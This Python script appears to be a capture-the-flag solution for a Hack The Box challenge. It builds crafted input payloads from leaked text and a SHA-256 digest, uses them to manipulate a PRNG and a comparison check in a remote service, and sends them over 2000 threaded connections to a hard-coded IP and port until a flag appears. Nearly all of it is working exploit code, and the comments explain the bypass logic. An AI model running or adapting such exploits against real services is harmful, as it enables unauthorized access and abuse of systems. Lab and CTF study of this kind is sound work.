#!/usr/bin/env python3
import hashlib
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

# Exact 100-byte chunks leaked with inputs 0..399.
story = (
    "**The Python in the Jungle**  \n\nIn the heart of the dense jungle, a wise old snake named **P7** slit"
    "hered through the vines. P7 wasn't just any snake-he was a **Python**, the master of logic, loops, a"
    "nd elegant syntax.  \n\nOne day, P7 discovered a hidden cave filled with mysterious symbols: `A, B, C,"
    " D...Y, Z, 0, 1, 2, 3...8, 9`. \"Ah, the building blocks of the universe!\" he hissed. With a flick of"
    " his tail, he rearranged the symbols into perfect sequences:  \n```python\nfor x in range(4):\n    prin"
    "t(chr(65 + x), x)\n```  \nA parrot, **Polly**, watched in awe. \"Squawk! What magic is this?\"  \n\n\"It's "
)
assert len(story) == 600, len(story)

digest = hashlib.sha256(b"").hexdigest()
indices = [story.index(c) for c in digest]

# Seven non-integers cause seven diagnostic PRNG draws. From the leak, the
# following draw is 0, so secret == '' and its digest is the value above.
# 29 oversized numeric fields are silently discarded; the resulting selected
# story string is exactly 64 bytes, making zip(forest, user_input[64:]) empty.
# Make the final seven digest selectors non-integers themselves. Their ord()
# values are the desired story indices, so they advance the PRNG without
# lengthening the selected output beyond the 64-byte digest.
eligible = [p for p, i in enumerate(indices) if chr(i) not in ",\r\n" and not chr(i).isdigit()]

def make_payload(k):
    chosen = set(eligible[:k])
    selectors = [chr(i) if p in chosen else str(i) for p, i in enumerate(indices)]
    fields = selectors + ["999999"] * 36
    assert len(fields) == 100
    return (",".join(fields) + "\n").encode()

if __name__ == "__main__":
  def worker(connection):
    try:
        with socket.create_connection(("154.57.164.76", 31595), timeout=5) as sock:
            sock.settimeout(2)
            sock.recv(4096)
            for attempt in range(5):
                payload = make_payload((connection * 5 + attempt) % (len(eligible) + 1))
                sock.sendall(payload)
                data = b""
                try:
                    while b"Try again" not in data and b"HTB{" not in data:
                        data += sock.recv(65536)
                except TimeoutError:
                    pass
                if connection == 0 and attempt == 0:
                    print(data.decode(errors="replace"), flush=True)
                if b"HTB{" in data:
                    return data.decode(errors="replace")
    except OSError:
        return None
    return None

  with ThreadPoolExecutor(max_workers=20) as pool:
    futures = [pool.submit(worker, n) for n in range(2000)]
    for done, future in enumerate(as_completed(futures), 1):
        result = future.result()
        if result:
            print(result)
            pool.shutdown(wait=False, cancel_futures=True)
            raise SystemExit
        if done % 100 == 0:
            print(f"tried {done} connections", flush=True)
  raise SystemExit("No zero-length draw encountered; run again")
